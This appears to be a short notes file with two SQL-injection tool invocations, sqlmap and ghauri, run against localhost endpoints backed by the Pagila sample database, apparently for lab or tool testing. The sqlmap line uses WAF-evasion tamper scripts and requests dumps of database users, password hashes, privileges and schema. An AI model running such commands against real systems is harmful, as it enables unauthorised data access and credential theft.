sqlmap -u "localhost:8000/union?q=John*" \
--dbms=postgresql \
--level=5 --risk=3 \
--flush-session --fresh-queries \
--skip-heuristics --skip-waf \
-f -b --current-user --current-db --hostname --is-dba --users --passwords \
--privileges --roles --dbs --tables --columns --schema --count --stop=3 \
--comments --statements \
--time-sec=1 --tamper="space2comment,between,randomcase" \
--technique=U

ghauri -u "localhost:8000/pagila?q=BARBARA.JONES@sakilacustomer.org*" \
--flush-session \
--fresh-queries \
--dbms=postgresql \
--level=3 \
-b --current-user --current-db --hostname --dbs --tables --columns --count --stop=3 \
--time-sec=1 \
--technique=S